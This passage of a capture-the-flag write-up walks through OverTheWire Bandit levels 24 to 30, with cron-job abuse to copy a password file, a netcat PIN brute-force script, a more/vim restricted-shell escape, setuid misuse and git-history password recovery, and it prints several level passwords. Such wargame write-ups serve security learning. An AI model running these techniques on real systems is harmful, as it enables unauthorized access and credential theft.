<span style="color:#75715e">#!/bin/bash</span>

myname<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>whoami<span style="color:#66d9ef">)</span>

cd /var/spool/$myname
echo <span style="color:#e6db74">&#34;Executing and deleting all scripts in /var/spool/</span>$myname<span style="color:#e6db74">:&#34;</span>
<span style="color:#66d9ef">for</span> i in * .*;
<span style="color:#66d9ef">do</span>
    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$i<span style="color:#e6db74">&#34;</span> !<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.&#34;</span> -a <span style="color:#e6db74">&#34;</span>$i<span style="color:#e6db74">&#34;</span> !<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;..&#34;</span> <span style="color:#f92672">]</span>;
    <span style="color:#66d9ef">then</span>
        echo <span style="color:#e6db74">&#34;Handling </span>$i<span style="color:#e6db74">&#34;</span>
        timeout -s <span style="color:#ae81ff">9</span> <span style="color:#ae81ff">60</span> ./$i
        rm -f ./$i
    <span style="color:#66d9ef">fi</span>
<span style="color:#66d9ef">done</span>
</code></pre></div><p>Once again this <strong>cron</strong> job is being ran as another user in this case <strong>bandit24</strong>. So <code>myname</code> will contain <code>bandit24</code>, leading us to the <code>/var/spool/bandit24</code> directory. The message printed by <strong>echo</strong> tells us that it will execute and delete all scripts in here, so our idea would be to create a script that will <strong>cat</strong> the password file into another file that we create. This very simple to write in a <strong>bash</strong> script, let&rsquo;s do it</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
mkdir /tmp/dirforcron
cat /etc/bandit_pass/bandit24 &gt; /tmp/dirforcron/pass
chmod <span style="color:#ae81ff">777</span> /tmp/dirforcron/pass
</code></pre></div><p>We will create this file in <code>/tmp/dirfortest/</code> and name it <code>script.sh</code>.
So what this do is creating a new directory to work in, cat the password file into a file in that directory and then changing the permissions to make it accessible to everyone. Now when we put this file in <code>/var/spool/bandit24</code> we have to be sure that the user who will run it has enough permissions to do so. We can do this by doing</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit23@bandit:/var/spool/bandit24$ chmod <span style="color:#ae81ff">777</span> /tmp/dirfortest/script.sh
</code></pre></div><p>Now that we gave it all the permissions possible we just need to copy it to <code>/var/spool/bandit24</code> and wait for it to be ran.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit23@bandit:/var/spool/bandit24$ cat /tmp/dirforcron/pass
cat: /tmp/dirforcron/pass: No such file or directory
bandit23@bandit:/var/spool/bandit24$ cat /tmp/dirforcron/pass
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
</code></pre></div><p>Success!!! Let&rsquo;s go onto the next one.</p>
<h2 id="level-25">Level 25</h2>
<blockquote>
<p>A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.</p>
</blockquote>
<p>First let&rsquo;s try to connect and see what it prints. We will use netcat to connect as before.</p>
<pre><code>bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
(...jibberish...)
Wrong! Please enter the correct current password. Try again.
^C
</code></pre><p>So it expects the password and the pin code in a line separated by a space. You can use your preferred scripting language to try and bruteforce this. I&rsquo;ll use bash since it doesn&rsquo;t depend on anything being preinstalled in the system (besides bash of course).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>rm input1.txt
rm input2.txt
rm output.txt

touch output.txt
touch input.txt
<span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>0000..5000<span style="color:#f92672">}</span>
<span style="color:#66d9ef">do</span>
        echo <span style="color:#e6db74">&#34;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ </span>$i<span style="color:#e6db74">&#34;</span> &gt;&gt; input1.txt
<span style="color:#66d9ef">done</span>

<span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>5001..9999<span style="color:#f92672">}</span>
<span style="color:#66d9ef">do</span>
        echo <span style="color:#e6db74">&#34;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ </span>$i<span style="color:#e6db74">&#34;</span> &gt;&gt; input2.txt
<span style="color:#66d9ef">done</span>

echo <span style="color:#e6db74">&#34;input created will start nc connection&#34;</span>

cat input1.txt | nc localhost <span style="color:#ae81ff">30002</span> &gt;&gt; output.txt
cat input2.txt | nc localhost <span style="color:#ae81ff">30002</span> &gt;&gt; output.txt

cat output.txt | grep -v Wrong
</code></pre></div><p>So what this does is it creates 2 input files with all the combinations. I do this because when i tried to do it all in once the connection tended to timeout. After creating the input i pipe it to a <strong>nc</strong> connection and write the result to a file. Finally, i pipe the content of the file to <strong>grep</strong> (the <code>-v</code> flag is to do invert macthing, so the lines that don&rsquo;t contain &ldquo;Wrong&rdquo;) and the correct answer should be there.</p>
<pre><code>bandit24@bandit:/tmp/testbash$ bash script.sh 
rm: cannot remove 'input1.txt': No such file or directory
rm: cannot remove 'input2.txt': No such file or directory
input created will start nc connection
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Timeout. Exiting.
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
</code></pre><p>Next one.</p>
<h2 id="level-26">Level 26</h2>
<p>So the challenge now says,</p>
<blockquote>
<p>Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.</p>
</blockquote>
<p>Let&rsquo;s inspect our current directory</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit25@bandit:~$ ls -la
total <span style="color:#ae81ff">32</span>
drwxr-xr-x  <span style="color:#ae81ff">2</span> root     root     <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">26</span> 18:23 .
drwxr-xr-x <span style="color:#ae81ff">41</span> root     root     <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> ..
-rw-r-----  <span style="color:#ae81ff">1</span> bandit25 bandit25   <span style="color:#ae81ff">33</span> May <span style="color:#ae81ff">26</span> 18:23 .bandit24.password
-r--------  <span style="color:#ae81ff">1</span> bandit25 bandit25 <span style="color:#ae81ff">1679</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> bandit26.sshkey
-rw-r--r--  <span style="color:#ae81ff">1</span> root     root      <span style="color:#ae81ff">220</span> May <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2017</span> .bash_logout
-rw-r--r--  <span style="color:#ae81ff">1</span> root     root     <span style="color:#ae81ff">3526</span> May <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2017</span> .bashrc
-rw-r-----  <span style="color:#ae81ff">1</span> bandit25 bandit25    <span style="color:#ae81ff">4</span> May <span style="color:#ae81ff">26</span> 18:23 .pin
-rw-r--r--  <span style="color:#ae81ff">1</span> root     root      <span style="color:#ae81ff">675</span> May <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2017</span> .profile
</code></pre></div><p>So we have a ssh key which i assume will be enough to log us in. Let&rsquo;s try it. I downloaded the key to my personal machine, <strong>set the right permissions</strong> and then tried to login.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">myuser@myuser:~$ ssh bandit26@bandit.labs.overthewire.org -p <span style="color:#ae81ff">2220</span> -i ~/Desktop/bandit26.sshkey
<span style="color:#f92672">(</span>...connection established...<span style="color:#f92672">)</span>
Connection to bandit.labs.overthewire.org closed.
myuser@myuser:~$
</code></pre></div><p>Hmmm&hellip; So it closed the connection immediately. Let&rsquo;s try to run a command through <strong>ssh</strong> instead of establishing the connection (like in <a href="#level-19">level 19</a>), more specifically, try to understand what shell user <strong>bandit26</strong> is running. We can do this by checking the content of the <code>$SHELL</code> variable.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">myuser@myuser:~$ ssh bandit26@bandit.labs.overthewire.org -p <span style="color:#ae81ff">2220</span> -i ~/Desktop/bandit26.sshkey <span style="color:#e6db74">&#39;echo $SHELL&#39;</span>
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
<span style="color:#f92672">(</span>...hangs...<span style="color:#f92672">)</span>
^C
myuser@myuser:~$
</code></pre></div><p>Well that didn&rsquo;t work. The connection just hanged. Let&rsquo;s go back to <strong>bandit25</strong> and check the content of the <code>/etc/passwd</code> file, since this stores information of the system users.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit25@bandit:~$ cat /etc/passwd
<span style="color:#f92672">(</span>...other users...<span style="color:#f92672">)</span>
bandit25:x:11025:11025:bandit level 25:/home/bandit25:/bin/bash
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
bandit27:x:11027:11027:bandit level 27:/home/bandit27:/bin/bash
<span style="color:#f92672">(</span>...other users...<span style="color:#f92672">)</span>
</code></pre></div><p>OK we got something. So <strong>bandit26</strong> is running <code>/usr/bin/showtext</code> as its default shell. Let&rsquo;s investigate that file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit25@bandit:~$ cat /usr/bin/showtext
<span style="color:#75715e">#!/bin/sh</span>

export TERM<span style="color:#f92672">=</span>linux

more ~/text.txt
exit <span style="color:#ae81ff">0</span>
</code></pre></div><p>So what this does is pretty much use <code>more</code> on file. <code>more</code> works like <code>less</code> which in sum are commands that help you viewing a file&rsquo;s content that doesn&rsquo;t fit on screen. So let&rsquo;s do that, make the terminal as tiny as we can.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">--More--<span style="color:#f92672">(</span>16%<span style="color:#f92672">)</span>
</code></pre></div><p>Ok so we got <code>more</code> running. Now i have no idea what to do. Let&rsquo;s check the <strong>man more</strong> page.
So from there we can see that there is an option that opens <code>vim</code> at the current line (vim is a terminal text editor).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">| |                   | <span style="color:#f92672">(</span>_<span style="color:#f92672">)</span> | |__ <span style="color:#ae81ff">\ </span>/ /
 | |__   __ _ _ __   __| |_| |_   <span style="color:#f92672">)</span> / /_
 | <span style="color:#e6db74">&#39;_ \ / _` | &#39;</span>_ <span style="color:#ae81ff">\ </span>/ _<span style="color:#e6db74">`</span> | | __| / / <span style="color:#960050;background-color:#1e0010">&#39;</span>_ <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span> | |_<span style="color:#f92672">)</span> | <span style="color:#f92672">(</span>_| | | | | <span style="color:#f92672">(</span>_| | | |_ / /| <span style="color:#f92672">(</span>_<span style="color:#f92672">)</span> |
 |_.__/ <span style="color:#ae81ff">\_</span>_,_|_| |_|<span style="color:#ae81ff">\_</span>_,_|_|<span style="color:#ae81ff">\_</span>_|____<span style="color:#ae81ff">\_</span>__/
~                                                                                      
~                                                                                      
</code></pre></div><p>Now we have it opened in <code>vim</code> as user <strong>bandit26</strong>. From vim we can get a shell via the <code>:shell</code> command. To do that just hit <strong>Esc</strong> and then type <code>:shell</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">  _                     _ _ _   ___   __
 | |                   | <span style="color:#f92672">(</span>_<span style="color:#f92672">)</span> | |__ <span style="color:#ae81ff">\ </span>/ /
:shell
</code></pre></div><p>Now hit enter.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">  _                     _ _ _   ___   __  
 | |                   | <span style="color:#f92672">(</span>_<span style="color:#f92672">)</span> | |__ <span style="color:#ae81ff">\ </span>/ /  
--More--<span style="color:#f92672">(</span>33%<span style="color:#f92672">)</span>
</code></pre></div><p>Wait&hellip; What? So that got us back to <code>more</code>&hellip; Oh right the shell was set to run <code>more</code> so we just need to change the <code>:shell</code> command in <code>vim</code>. We can do this by typing in command mode <code>:set shell=/bin/bash</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> |_.__/ <span style="color:#ae81ff">\_</span>_,_|_| |_|<span style="color:#ae81ff">\_</span>_,_|_|<span style="color:#ae81ff">\_</span>_|____<span style="color:#ae81ff">\_</span>__/
~                                                                                      
:set shell<span style="color:#f92672">=</span>/bin/bash
</code></pre></div><p>And now run the <code>:shell</code> command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit26@bandit:~$ 
</code></pre></div><p>WE GOT A SHELL!!! Next challenge then.</p>
<h2 id="level-27">Level 27</h2>
<p>We will be using the shell established from the previous level. Let&rsquo;s check the current directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit26@bandit:~$ ls -la
total <span style="color:#ae81ff">36</span>
drwxr-xr-x  <span style="color:#ae81ff">3</span> root     root     <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> .
drwxr-xr-x <span style="color:#ae81ff">41</span> root     root     <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> ..
-rwsr-x---  <span style="color:#ae81ff">1</span> bandit27 bandit26 <span style="color:#ae81ff">7296</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> bandit27-do
-rw-r--r--  <span style="color:#ae81ff">1</span> root     root      <span style="color:#ae81ff">220</span> May <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2017</span> .bash_logout
-rw-r--r--  <span style="color:#ae81ff">1</span> root     root     <span style="color:#ae81ff">3526</span> May <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2017</span> .bashrc
-rw-r--r--  <span style="color:#ae81ff">1</span> root     root      <span style="color:#ae81ff">675</span> May <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2017</span> .profile
drwxr-xr-x  <span style="color:#ae81ff">2</span> root     root     <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> .ssh
-rw-r-----  <span style="color:#ae81ff">1</span> bandit26 bandit26  <span style="color:#ae81ff">258</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> text.txt
</code></pre></div><p>This brings us back to <a href="#level-20">level 20</a> where we had a setuid binary. This is easy then, let&rsquo;s just <strong>cat</strong> the password file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
3ba3118a22e93127a4ed485be72ef5ea
</code></pre></div><p>Good job! Next.</p>
<h2 id="level-28">Level 28</h2>
<p>In this challenge we will have to work with <strong>git</strong> if you know nothing about it you should google it and read a few cheatsheets.</p>
<blockquote>
<p>There is a git repository at ssh://bandit27-git@localhost/home/bandit27-git/repo. The password for the user bandit27-git is the same as for the user bandit27.</p>
</blockquote>
<blockquote>
<p>Clone the repository and find the password for the next level.</p>
</blockquote>
<p>So i&rsquo;ll first create a directory to clone the repository to, and then clone it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit27@bandit:~$ mkdir /tmp/gitfolder
bandit27@bandit:~$ cd /tmp/gitfolder
bandit27@bandit:/tmp/gitfolder$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
Cloning into <span style="color:#e6db74">&#39;repo&#39;</span>...
Could not create directory <span style="color:#e6db74">&#39;/home/bandit27/.ssh&#39;</span>.
The authenticity of host <span style="color:#e6db74">&#39;localhost (127.0.0.1)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
</span><span style="color:#e6db74">ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
</span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no)? yes
</span><span style="color:#e6db74">Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).
</span><span style="color:#e6db74">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">bandit27-git@localhost&#39;</span>s password: 
remote: Counting objects: 3, <span style="color:#66d9ef">done</span>.
remote: Compressing objects: 100% <span style="color:#f92672">(</span>2/2<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
remote: Total <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>delta 0<span style="color:#f92672">)</span>, reused <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>delta 0<span style="color:#f92672">)</span>
Receiving objects: 100% <span style="color:#f92672">(</span>3/3<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
bandit27@bandit:~$
</code></pre></div><p>Done. Let&rsquo;s inspect the repo we&rsquo;ve just cloned.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit27@bandit:/tmp/gitfolder$ ls -la
total <span style="color:#ae81ff">1952</span>
drwxr-sr-x     <span style="color:#ae81ff">3</span> bandit27 root    <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 13:46 .
drwxrws-wt <span style="color:#ae81ff">57125</span> root     root <span style="color:#ae81ff">1986560</span> Jul  <span style="color:#ae81ff">6</span> 13:47 ..
drwxr-sr-x     <span style="color:#ae81ff">3</span> bandit27 root    <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 13:47 repo
bandit27@bandit:/tmp/gitfolder$ cd repo/
bandit27@bandit:/tmp/gitfolder/repo$ ls -la
total <span style="color:#ae81ff">16</span>
drwxr-sr-x <span style="color:#ae81ff">3</span> bandit27 root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 13:47 .
drwxr-sr-x <span style="color:#ae81ff">3</span> bandit27 root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 13:46 ..
drwxr-sr-x <span style="color:#ae81ff">8</span> bandit27 root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 13:47 .git
-rw-r--r-- <span style="color:#ae81ff">1</span> bandit27 root   <span style="color:#ae81ff">68</span> Jul  <span style="color:#ae81ff">6</span> 13:47 README
</code></pre></div><p>Let&rsquo;s check that <code>README</code> file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit27@bandit:/tmp/gitfolder/repo$ cat README 
The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2
</code></pre></div><p>Done.</p>
<h2 id="level-29">Level 29</h2>
<p>Once again in this challenge we will have to work with git,</p>
<blockquote>
<p>There is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo. The password for the user bandit28-git is the same as for the user bandit28.</p>
</blockquote>
<blockquote>
<p>Clone the repository and find the password for the next level.</p>
</blockquote>
<p>So let&rsquo;s clone it again and see the repo content.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit28@bandit:~$ mkdir /tmp/gitfolder2
bandit28@bandit:~$ cd /tmp/gitfolder2
bandit28@bandit:/tmp/gitfolder2$ git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
Cloning into <span style="color:#e6db74">&#39;repo&#39;</span>...
Could not create directory <span style="color:#e6db74">&#39;/home/bandit28/.ssh&#39;</span>.
The authenticity of host <span style="color:#e6db74">&#39;localhost (127.0.0.1)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
</span><span style="color:#e6db74">ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
</span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no)? yes
</span><span style="color:#e6db74">Failed to add the host to the list of known hosts (/home/bandit28/.ssh/known_hosts).
</span><span style="color:#e6db74">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">bandit28-git@localhost&#39;</span>s password: 
remote: Counting objects: 9, <span style="color:#66d9ef">done</span>.
remote: Compressing objects: 100% <span style="color:#f92672">(</span>6/6<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
remote: Total <span style="color:#ae81ff">9</span> <span style="color:#f92672">(</span>delta 2<span style="color:#f92672">)</span>, reused <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>delta 0<span style="color:#f92672">)</span>
Receiving objects: 100% <span style="color:#f92672">(</span>9/9<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
Resolving deltas: 100% <span style="color:#f92672">(</span>2/2<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
</code></pre></div><p>Inspect the repo.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit28@bandit:/tmp/gitfolder2$ cd repo/
bandit28@bandit:/tmp/gitfolder2/repo$ ls -la
total <span style="color:#ae81ff">16</span>
drwxr-sr-x <span style="color:#ae81ff">3</span> bandit28 root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 13:51 .
drwxr-sr-x <span style="color:#ae81ff">3</span> bandit28 root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 13:51 ..
drwxr-sr-x <span style="color:#ae81ff">8</span> bandit28 root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 13:51 .git
-rw-r--r-- <span style="color:#ae81ff">1</span> bandit28 root  <span style="color:#ae81ff">111</span> Jul  <span style="color:#ae81ff">6</span> 13:51 README.md
bandit28@bandit:/tmp/gitfolder2/repo$ cat README.md 
<span style="color:#75715e"># Bandit Notes</span>
Some notes <span style="color:#66d9ef">for</span> level29 of bandit.

<span style="color:#75715e">## credentials</span>

- username: bandit29
- password: xxxxxxxxxx
</code></pre></div><p>I saw a <code>README.md</code> file so i used <strong>cat</strong> to see it&rsquo;s content and there was nothing there. Let&rsquo;s inspect the commits made by doing <code>git log</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit28@bandit:/tmp/gitfolder2/repo$ git log
commit 073c27c130e6ee407e12faad1dd3848a110c4f95
Author: Morla Porla &lt;morla@overthewire.org&gt;
Date:   Tue Oct <span style="color:#ae81ff">16</span> 14:00:39 <span style="color:#ae81ff">2018</span> +0200

    fix info leak

commit 186a1038cc54d1358d42d468cdc8e3cc28a93fcb
Author: Morla Porla &lt;morla@overthewire.org&gt;
Date:   Tue Oct <span style="color:#ae81ff">16</span> 14:00:39 <span style="color:#ae81ff">2018</span> +0200

    add missing data

commit b67405defc6ef44210c53345fc953e6a21338cc7
Author: Ben Dover &lt;noone@overthewire.org&gt;
Date:   Tue Oct <span style="color:#ae81ff">16</span> 14:00:39 <span style="color:#ae81ff">2018</span> +0200

    initial commit of README.md
</code></pre></div><p>Hmm&hellip; So the password used to be there but unfortunately someone was smart enough to remove it. We can go back to that commit by doing <code>git checkout</code> followed by the commit id. Let&rsquo;s do it then.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit28@bandit:/tmp/gitfolder2/repo$ git checkout 186a1038cc54d1358d42d468cdc8e3cc28a93fcb
Note: checking out <span style="color:#e6db74">&#39;186a1038cc54d1358d42d468cdc8e3cc28a93fcb&#39;</span>.

You are in <span style="color:#e6db74">&#39;detached HEAD&#39;</span> state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by performing another checkout.

If you want to create a new branch to retain commits you create, you may
<span style="color:#66d9ef">do</span> so <span style="color:#f92672">(</span>now or later<span style="color:#f92672">)</span> by using -b with the checkout command again. Example:

  git checkout -b &lt;new-branch-name&gt;

HEAD is now at 186a103... add missing data
</code></pre></div><p>Let&rsquo;s see what was the state of the repo in this commit.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit28@bandit:/tmp/gitfolder2/repo$ ls -la
total <span style="color:#ae81ff">16</span>
drwxr-sr-x <span style="color:#ae81ff">3</span> bandit28 root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 13:55 .
drwxr-sr-x <span style="color:#ae81ff">3</span> bandit28 root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 13:51 ..
drwxr-sr-x <span style="color:#ae81ff">8</span> bandit28 root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 13:55 .git
-rw-r--r-- <span style="color:#ae81ff">1</span> bandit28 root  <span style="color:#ae81ff">133</span> Jul  <span style="color:#ae81ff">6</span> 13:55 README.md
</code></pre></div><p>Still has the <code>README.md</code> file. By reading the commit messages we thought that there should be an information leak in this commit. Let&rsquo;s print the file&rsquo;s content.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit28@bandit:/tmp/gitfolder2/repo$ cat README.md 
<span style="color:#75715e"># Bandit Notes</span>
Some notes <span style="color:#66d9ef">for</span> level29 of bandit.

<span style="color:#75715e">## credentials</span>

- username: bandit29
- password: bbc96594b4e001778eee9975372716b2
</code></pre></div><p>We got the password. Good job! Onto the next one.</p>
<h2 id="level-30">Level 30</h2>
<p>Same thing as before. We have a repo we need to clone it to a folder.</p>
<pre><code>bandit29@bandit:~$ mkdir /tmp/gitfolder3
bandit29@bandit:~$ cd /tmp/gitfolder3
bandit29@bandit:/tmp/gitfolder3$ git clone ssh://bandit29-git@localhost/home/bandit29-git/repo
Cloning into 'repo'...
Could not create directory '/home/bandit29/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit29/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit29-git@localhost's password: 
remote: Counting objects: 16, done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 16 (delta 2), reused 0 (delta 0)
Receiving objects: 100% (16/16), done.
Resolving deltas: 100% (2/2), done.
bandit29@bandit:/tmp/gitfolder3$ ls -la
total 1952
drwxr-sr-x     3 bandit29 root    4096 Jul  6 14:02 .
drwxrws-wt 57133 root     root 1986560 Jul  6 14:02 ..
drwxr-sr-x     3 bandit29 root    4096 Jul  6 14:02 repo
bandit29@bandit:/tmp/gitfolder3$ cd repo/
bandit29@bandit:/tmp/gitfolder3/repo$ ls -al
total 16
drwxr-sr-x 3 bandit29 root 4096 Jul  6 14:02 .
drwxr-sr-x 3 bandit29 root 4096 Jul  6 14:02 ..
drwxr-sr-x 8 bandit29 root 4096 Jul  6 14:02 .git
-rw-r--r-- 1 bandit29 root  131 Jul  6 14:02 README.md
</code></pre><p>Once again let&rsquo;s see <code>README.md</code>&rsquo;s content.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit29@bandit:/tmp/gitfolder3/repo$ cat README.md 
<span style="color:#75715e"># Bandit Notes</span>
Some notes <span style="color:#66d9ef">for</span> bandit30 of bandit.

<span style="color:#75715e">## credentials</span>

- username: bandit30
- password: &lt;no passwords in production!&gt;
</code></pre></div><p>We&rsquo;ve been through this before. Let&rsquo;s check the previous commits.</p>
